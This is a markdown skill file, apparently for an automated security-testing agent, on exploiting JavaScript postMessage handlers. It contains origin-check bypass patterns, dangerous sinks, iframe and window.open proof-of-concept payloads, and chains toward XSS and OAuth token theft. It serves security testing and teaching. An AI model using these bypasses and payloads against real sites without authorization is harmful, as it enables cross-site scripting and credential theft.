---
name: postmessage-abuse
description: "PostMessage vulnerability patterns. Load when a solver encounters addEventListener('message') handlers, postMessage calls, or cross-origin communication patterns."
---

# PostMessage Abuse Skill

## Vulnerable patterns

### Missing origin check
```javascript
window.addEventListener('message', function(e) {
  // Accepts from ANY origin — exploitable cross-origin
  doSomething(e.data);
});
```

### Weak origin checks (all bypassable)
| Pattern | Bypass |
|---------|--------|
| `e.origin.indexOf('target.com')` | `attacker-target.com` |
| `e.origin.endsWith('target.com')` | `attackertarget.com` |
| `e.origin === 'null'` | Sandboxed iframe sends origin `null` |
| `e.origin.includes('target')` | `target.attacker.com` |
| `/target\.com/.test(e.origin)` | `target.com.attacker.com` (no anchoring) |
| `e.origin.startsWith('https://target')` | `https://target.attacker.com` |

### Data flowing to dangerous sinks
| Sink | Impact |
|------|--------|
| `innerHTML = e.data` | XSS via postMessage |
| `eval(e.data)` / `Function(e.data)()` | Arbitrary code execution |
| `location.href = e.data` | Open redirect |
| `fetch(e.data.url, e.data.opts)` | Arbitrary request (proxy gadget) |
| `document.cookie = e.data` | Cookie manipulation |
| `localStorage.setItem(k, e.data)` | Storage poisoning |

### PostMessage as proxy gadget (high-value finding)
Handler forwards attacker data to `fetch()` without origin check:
- Attacker iframe → `postMessage` → target handler → `fetch(attacker-controlled-URL)`
- Bypasses Same-Origin Policy for the attacker
- Even without XSS, enables cross-origin data access
- Can chain with CSRF: handler makes state-changing API call with attacker-controlled params

## PortSwigger Top 10 2025 relevance
- "DOM-based Extension Clickjacking" — password manager autofill UI injected into page DOM via postMessage; attacker hides/repositions elements to coerce clicks that autofill credentials into attacker-controlled fields.

## Exploitation

### Standard PoC (iframe-based)
```html
<iframe id="target" src="https://target.com/vulnerable-page"></iframe>
<script>
document.getElementById('target').onload = function() {
  this.contentWindow.postMessage({type: 'update', data: '<img src=x onerror=alert(1)>'}, '*');
};
</script>
```

### window.open variant (when X-Frame-Options blocks iframe)
```html
<script>
var w = window.open('https://target.com/vulnerable-page');
setTimeout(function() {
  w.postMessage({type: 'update', data: 'payload'}, '*');
}, 2000);
</script>
```

### Chaining with other vulns
- PostMessage proxy + SSRF endpoint = server-side access from browser
- PostMessage → `location.href` + OAuth callback = token theft
- PostMessage → `eval()` = full XSS (rare but devastating)
- PostMessage handler writes to `localStorage` → another page reads from `localStorage` into innerHTML = stored DOM XSS

## Gotchas
- `X-Frame-Options: DENY` or `frame-ancestors 'none'` blocks iframe — use `window.open` instead
- Some handlers validate `e.source` — harder to exploit
- Some handlers validate `e.data` structure (typeof checks, required fields) — match expected schema
- Chrome's postMessage `targetOrigin` parameter on the SENDING side is different from origin validation on the RECEIVING side — both need to be checked

## Key references
- PortSwigger DOM-based postMessage: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source
- DOM Invader postMessage testing: https://portswigger.net/burp/documentation/desktop/tools/dom-invader/web-messages
- PortSwigger Top 10 2025: "DOM-based Extension Clickjacking" — credential theft via postMessage UI manipulation
